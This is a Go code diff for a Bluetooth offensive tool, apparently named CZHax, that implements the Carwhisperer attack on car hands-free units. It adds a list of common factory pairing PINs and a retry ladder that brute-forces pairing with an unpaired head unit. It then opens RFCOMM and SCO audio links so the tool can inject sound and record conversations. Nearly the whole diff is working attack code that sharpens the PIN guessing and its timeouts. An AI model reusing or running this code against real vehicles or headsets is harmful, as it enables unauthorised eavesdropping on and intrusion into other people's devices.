@@ -3,6 +3,7 @@ package bluetooth
 import (
 	"context"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io"
 	"os"
@@ -48,6 +49,40 @@ func FormatBDAddr(addr [6]byte) string {
 	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
 		addr[5], addr[4], addr[3], addr[2], addr[1], addr[0])
 }
+
+// carwhispererPINs is the PIN list tried against an unpaired head unit, in
+// order. The two Bluetooth defaults come first, then the factory PINs these
+// radios actually ship with.
+var carwhispererPINs = []string{
+	"0000",
+	"1234",
+	"1111",
+	"12345",
+	"123456",
+	"000000",
+	"12345678",
+	"00000000",
+	"1212",
+	"00000",
+	"4444",
+	"5555",
+	"7777",
+	"8888",
+	"9999",
+	"1122",
+	"0001",
+	"0011",
+	"0111",
+}
+
+const (
+	// rfcommConnectTimeout applies to the pairing-agent probes (SSP and
+	// JustWorks) where a failure usually means "not reachable yet".
+	rfcommConnectTimeout = 30 * time.Second
+	// rfcommPinTimeout keeps a wrong-PIN retry cheap: a rejected PIN fails on
+	// authentication almost immediately.
+	rfcommPinTimeout = 12 * time.Second
+)
 
 // Carwhisperer opens the hands-free RFCOMM channel and the SCO audio link to a
 // Classic headset/car kit, injects silence (or playPath) and optionally records
@@ -108,7 +143,7 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 		_ = exec.Command("hciconfig", hciName, "voice", "0x0060").Run()
 	}
 
-	rfd, err := connectRFCOMMWithPairing(local, addr, address, emit)
+	rfd, err := connectRFCOMMWithPairing(ctx, local, addr, address, emit)
 	if err != nil {
 		return fmt.Errorf("connect RFCOMM channel 1: %w (check the adapter is powered; CZHax needs root)", err)
 	}
@@ -164,32 +199,55 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 	return nil
 }
 
-func connectRFCOMMWithPairing(local, remote [6]byte, address string, emit func(string, ...any)) (int, error) {
+// rfcommPairAttempt is one pairing + RFCOMM probe.
+type rfcommPairAttempt struct {
+	capability string
+	pin        string
+	timeout    time.Duration
+}
+
+// carwhispererPairAttempts builds the pairing ladder: PIN-less SSP/JustWorks
+// agents first, then one KeyboardOnly attempt per PIN in carwhispererPINs
+// order.
+func carwhispererPairAttempts() []rfcommPairAttempt {
+	attempts := []rfcommPairAttempt{
+		{capability: "DisplayYesNo", timeout: rfcommConnectTimeout},
+		{capability: "NoInputNoOutput", timeout: rfcommConnectTimeout},
+	}
+	for _, pin := range carwhispererPINs {
+		attempts = append(attempts, rfcommPairAttempt{
+			capability: "KeyboardOnly",
+			pin:        pin,
+			timeout:    rfcommPinTimeout,
+		})
+	}
+	return attempts
+}
+
+func connectRFCOMMWithPairing(ctx context.Context, local, remote [6]byte, address string, emit func(string, ...any)) (int, error) {
 	if devicePaired(address) {
 		return openRFCOMM(local, remote, 1)
 	}
-	type attempt struct {
-		capability string
-		pin        string
-	}
-	attempts := []attempt{
-		{capability: "DisplayYesNo"},
-		{capability: "NoInputNoOutput"},
-		{capability: "KeyboardOnly", pin: "0000"},
-		{capability: "KeyboardOnly", pin: "1234"},
-	}
+	attempts := carwhispererPairAttempts()
 	var last error
-	for _, a := range attempts {
-		agent, err := startPairingAgent(address, a.capability, a.pin)
+	timeouts := 0
+	for i, a := range attempts {
+		if err := ctx.Err(); err != nil {
+			return -1, err
+		}
+		agent, pinFile, err := startPairingAgent(address, a.capability, a.pin)
 		if err != nil {
 			last = err
 			continue
 		}
 		time.Sleep(350 * time.Millisecond)
-		emit("Trying RFCOMM with %s agent%s", a.capability, pinLabel(a.pin))
-		fd, err := openRFCOMM(local, remote, 1)
+		emit("Try %d/%d: %s%s", i+1, len(attempts), a.capability, pinLabel(a.pin))
+		fd, err := openRFCOMMWithTimeout(local, remote, 1, a.timeout)
 		_ = agent.Process.Kill()
 		_, _ = agent.Process.Wait()
+		if pinFile != "" {
+			_ = os.Remove(pinFile)
+		}
 		if err == nil {
 			if devicePaired(address) {
 				_ = exec.Command("bluetoothctl", "trust", NormalizeAddr(address)).Run()
@@ -197,6 +255,22 @@ func connectRFCOMMWithPairing(local, remote [6]byte, address string, emit func(s
 			return fd, nil
 		}
 		last = err
+
+		// A wrong PIN fails on authentication, not by timing out. Two
+		// consecutive timeouts mean the radio stopped answering, so burning
+		// through the rest of the PIN list would just take minutes.
+		if errors.Is(err, unix.ETIMEDOUT) || errors.Is(err, unix.EHOSTDOWN) {
+			timeouts++
+			if timeouts >= 2 {
+				emit("Device unreachable, stopped after %d attempts", i+1)
+				break
+			}
+		} else {
+			timeouts = 0
+		}
+	}
+	if last == nil {
+		last = errors.New("no pairing attempt succeeded")
 	}
 	return -1, last
 }
@@ -212,31 +286,47 @@ func devicePaired(address string) bool {
 	return strings.Contains(string(out), "Paired: yes")
 }
 
-func startPairingAgent(address, capability, pin string) (*exec.Cmd, error) {
+func startPairingAgent(address, capability, pin string) (*exec.Cmd, string, error) {
 	if _, err := exec.LookPath("bt-agent"); err != nil {
-		return nil, err
+		return nil, "", err
 	}
 	args := []string{"-c", capability}
+	pinFile := ""
 	if pin != "" {
-		pinFile := filepath.Join(os.TempDir(), fmt.Sprintf("czhax-bt-pin-%d", os.Getpid()))
-		if err := os.WriteFile(pinFile, []byte(NormalizeAddr(address)+" "+pin+"\n"), 0o600); err != nil {
-			return nil, err
+		// bt-agent reads the PIN file when it starts, so it must outlive
+		// Start() (the old code removed it immediately, before the agent could
+		// open it). The caller removes it once the agent is killed.
+		f, err := os.CreateTemp("", "czhax-bt-pin-*")
+		if err != nil {
+			return nil, "", err
 		}
-		defer os.Remove(pinFile)
+		pinFile = f.Name()
+		_, werr := f.WriteString(NormalizeAddr(address) + " " + pin + "\n")
+		cerr := f.Close()
+		if werr != nil || cerr != nil {
+			_ = os.Remove(pinFile)
+			if werr != nil {
+				return nil, "", werr
+			}
+			return nil, "", cerr
+		}
 		args = append(args, "-p", pinFile)
 	}
 	cmd := exec.Command("bt-agent", args...)
 	if err := cmd.Start(); err != nil {
-		return nil, err
+		if pinFile != "" {
+			_ = os.Remove(pinFile)
+		}
+		return nil, "", err
 	}
-	return cmd, nil
+	return cmd, pinFile, nil
 }
 
 func pinLabel(pin string) string {
 	if pin == "" {
-		return ""
+		return " agent"
 	}
-	return " PIN " + pin
+	return " agent PIN " + pin
 }
 
 func prepareCarwhispererAdapter(hciName string) error {
@@ -316,6 +406,10 @@ func localAdapterAddr(hciName string) ([6]byte, error) {
 }
 
 func openRFCOMM(local, remote [6]byte, channel int) (int, error) {
+	return openRFCOMMWithTimeout(local, remote, channel, 30*time.Second)
+}
+
+func openRFCOMMWithTimeout(local, remote [6]byte, channel int, timeout time.Duration) (int, error) {
 	if channel <= 0 || channel > 30 {
 		channel = 1
 	}
@@ -335,7 +429,7 @@ func openRFCOMM(local, remote [6]byte, channel int) (int, error) {
 			unix.Close(fd)
 			return -1, err
 		}
-		if werr := waitWritable(fd); werr != nil {
+		if werr := waitWritable(fd, timeout); werr != nil {
 			unix.Close(fd)
 			return -1, werr
 		}
@@ -344,9 +438,12 @@ func openRFCOMM(local, remote [6]byte, channel int) (int, error) {
 	return fd, nil
 }
 
-func waitWritable(fd int) error {
+func waitWritable(fd int, timeout time.Duration) error {
+	if timeout <= 0 {
+		timeout = 30 * time.Second
+	}
 	pfd := []unix.PollFd{{Fd: int32(fd), Events: unix.POLLOUT}}
-	deadline := time.Now().Add(30 * time.Second)
+	deadline := time.Now().Add(timeout)
 	for time.Now().Before(deadline) {
 		n, err := unix.Poll(pfd, 250)
 		if err != nil {
@@ -411,7 +508,7 @@ func connectSCO(fd int, addr [6]byte) error {
 	// SCO connect can report EINPROGRESS even on a blocking socket. Wait for
 	// writability and inspect SO_ERROR, equivalent to the C tool's blocking
 	// connect() completing.
-	return waitWritable(fd)
+	return waitWritable(fd, 30*time.Second)
 }
 
 func carwhispererRFCOMM(ctx context.Context, fd int, emit func(string, ...any)) {
